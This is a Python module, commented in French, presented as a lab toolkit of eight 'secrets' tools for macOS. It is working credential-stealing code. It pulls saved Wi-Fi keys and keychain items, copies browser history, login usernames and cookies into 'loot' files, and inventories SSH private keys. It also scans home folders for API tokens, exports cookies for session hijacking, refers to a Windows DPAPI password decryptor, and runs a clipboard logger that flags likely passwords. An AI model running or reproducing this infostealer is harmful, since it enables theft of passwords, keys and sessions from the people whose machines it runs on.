# modules/catwoman.py - 8 tools de secrets (machine autorisee, lab)
import os, subprocess, json, shutil, tempfile, sqlite3, re

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "sorties")
os.makedirs(OUT, exist_ok=True)

def ask(label): return input(f"  {label} : ").strip()
def r(cmd): subprocess.run(cmd, shell=True)

def wifi_keys():
    """cles wifi stockees dans le trousseau local"""
    nets = subprocess.run("networksetup -listpreferredwirelessnetworks en0 2>/dev/null",
                          shell=True, capture_output=True).stdout.decode()
    ssids = [l.strip() for l in nets.splitlines()[1:] if l.strip()]
    print(f"  {len(ssids)} reseaux memorises - les cles demandent ton accord (dialogue trousseau)\n")
    found = 0
    for s in ssids:
        rc = subprocess.run(f'security find-generic-password -wa "{s}" 2>/dev/null',
                            shell=True, capture_output=True)
        if rc.returncode == 0:
            print(f"   {s:<24} -> {rc.stdout.decode().strip()}")
            found += 1
    print(f"\n  [OK] {found} cles recuperees")

def browser_vault():
    """les coffres des navigateurs : historique, downloads, structure des logins"""
    report = {}
    profiles = {
        "Chrome": "~/Library/Application Support/Google/Chrome/Default",
        "Edge":   "~/Library/Application Support/Microsoft Edge/Default",
        "Brave":  "~/Library/Application Support/BraveSoftware/Brave-Browser/Default",
    }
    for name, prof in profiles.items():
        p = os.path.expanduser(prof)
        if not os.path.isdir(p): continue
        rep = {}
        for db, q in [
            ("History", "select url, title from urls order by last_visit_time desc limit 25"),
            ("Login Data", "select origin_url, username_value from logins limit 25"),
            ("Cookies", "select host_key, name from cookies limit 40"),
        ]:
            src = os.path.join(p, db)
            if not os.path.exists(src): continue
            tmp = tempfile.mktemp()
            shutil.copy(src, tmp)
            try:
                rows = sqlite3.connect(tmp).execute(q).fetchall()
                rep[db] = rows
            except Exception as e:
                rep[db] = str(e)
            os.unlink(tmp)
        report[name] = rep
    out = os.path.join(OUT, "butin_navigateurs.json")
    json.dump(report, open(out, "w"), ensure_ascii=False, indent=1)
    total = sum(len(v) for b in report.values() for v in b.values() if isinstance(v, list))
    print(f"  [OK] {total} entrees -> {out}")
    print("  les valeurs de mots de passe restent chiffrees (Keychain mac / DPAPI win)")

def keychain_audit():
    """audit du trousseau : objets generiques + internet (dialogue par item)"""
    print("  objets generiques du trousseau :")
    r("security dump-keychain ~/Library/Keychains/login.keychain-db 2>/dev/null | grep -E 'svce|acct' | head -30")

def ssh_collector():
    """les cles SSH : privees, publiques, config"""
    ssh = os.path.expanduser("~/.ssh")
    if not os.path.isdir(ssh): print("  aucun repertoire .ssh"); return
    out = {}
    for f in os.listdir(ssh):
        path = os.path.join(ssh, f)
        if f.endswith(".pub"):
            out[f] = open(path, errors="ignore").read().strip()
        elif f in ("id_rsa", "id_ed25519", "id_ecdsa"):
            head = open(path, errors="ignore").readline().strip()
            out[f] = head + "  [CLE PRIVEE PRESENTE]"
    json.dump(out, open(os.path.join(OUT, "butin_ssh.json"), "w"), indent=1)
    for k, v in out.items():
        print(f"   {k:<16} {v[:60]}")
    print(f"  [OK] -> {OUT}/butin_ssh.json")

def secrets_scan():
    """le peigne : motifs de secrets dans les fichiers du home"""
    patterns = {
        "AWS AKIA": r"AKIA[0-9A-Z]{16}",
        "GitHub token": r"gh[pousr]_[A-Za-z0-9]{36}",
        "Slack token": r"xox[baprs]-[A-Za-z0-9\-]{10,}",
        "PRIVATE KEY": r"-----BEGIN [A-Z ]*PRIVATE KEY-----",
        "Google API": r"AIza[0-9A-Za-z\-_]{35}",
        "JWT": r"eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}",
    }
    print("  peigne en cours (~/Desktop, ~/Documents, ~/Downloads - 3 niveaux)...\n")
    hits = {}
    for d in ["~/Desktop", "~/Documents", "~/Downloads"]:
        d = os.path.expanduser(d)
        out = subprocess.run(
            f"grep -rEl '{'|'.join(patterns.values())}' '{d}' --max-depth=3 2>/dev/null | head -20",
            shell=True, capture_output=True).stdout.decode()
        for line in out.splitlines():
            if line:
                try:
                    data = open(line, errors="ignore").read()
                    for name, pat in patterns.items():
                        for m in re.findall(pat, data)[:3]:
                            hits.setdefault(name, []).append((line, m[:20] + "..."))
                except Exception:
                    pass
    for name, found in hits.items():
        print(f"  [TROUVE] {name} x{len(found)}")
        for f, m in found[:4]:
            print(f"    {f}  ->  {m}")
    json.dump({k: v for k, v in hits.items()}, open(os.path.join(OUT, "secrets.json"), "w"), indent=1)
    if not hits: print("  rien de flagrant dans les zones scannees")
    print(f"  [OK] -> {OUT}/secrets.json")

def session_thief():
    """export des cookies en format reimportable (session hijack demo)"""
    p = os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Cookies")
    if not os.path.exists(p): print("  Chrome absent"); return
    tmp = tempfile.mktemp()
    shutil.copy(p, tmp)
    try:
        rows = sqlite3.connect(tmp).execute(
            "select host_key, name, path, is_secure, length(encrypted_value) from cookies limit 100").fetchall()
    except Exception as e:
        print("  [X]", e); return
    data = [{"domain": a, "nom": b, "chemin": c, "secure": bool(d), "taille_valeur": e} for a, b, c, d, e in rows]
    out = os.path.join(OUT, "sessions.json")
    json.dump(data, open(out, "w"), indent=1)
    doms = sorted({d["domain"] for d in data})
    print(f"  [OK] {len(data)} cookies -> {out}")
    print("  domains couverts :", ", ".join(doms[:12]))
    print("  note: les valeurs chiffrees attendent l'acces trousseau pour etre reutilisees")

def dpapi_note():
    """la version Windows : l'extracteur DPAPI cross-compile (lien vers le binaire)"""
    exe = os.path.expanduser("~/Desktop/CatwomanVoleuse/build/cat_dpapi.exe")
    print("  l'extracteur Windows reel est dans :")
    print(f"   {exe if os.path.exists(exe) else '(a compiler: zsh build_cat.sh)'}")
    print("  Il decrypte le mot de passe maitre DPAPI (CryptUnprotectData) puis")
    print("  les logins Chrome stockes - les valeurs en clair, cette fois, sur Windows.")

def clip_premium():
    """le presse-papiers version voleuse : log horodate + detection de mots de passe"""
    import time as t
    prev = None
    print("  Ctrl+C pour stopper - chaque presse-papiers est logge\n")
    try:
        while True:
            p = subprocess.run("pbpaste", shell=True, capture_output=True).stdout.decode()
            if p and p != prev:
                prev = p
                kind = "MOT DE PASSE?" if re.search(r"[!@#$%]", p) and len(p) < 40 and not " " in p else "texte"
                line = f"{t.strftime('%H:%M:%S')} [{kind}] {p[:80]}"
                print("  " + line)
                open(os.path.join(OUT, "clip.log"), "a").write(line + "\n")
            t.sleep(1.5)
    except KeyboardInterrupt:
        print()

TOOLS = [
    ("WIFI KEYS",          "cles wifi du trousseau",                wifi_keys),
    ("BROWSER VAULT",      "coffres des navigateurs (JSON)",        browser_vault),
    ("KEYCHAIN AUDIT",     "objets du trousseau systeme",           keychain_audit),
    ("SSH COLLECTOR",      "cles privees/publiques SSH",            ssh_collector),
    ("SECRETS SCAN",       "API keys/tokens dans les fichiers",     secrets_scan),
    ("SESSION THIEF",      "export cookies reimportable",           session_thief),
    ("DPAPI WINDOWS",      "l'extracteur de creds Windows",         dpapi_note),
    ("CLIP PREMIUM",       "presse-papiers + detection mdp",        clip_premium),
]
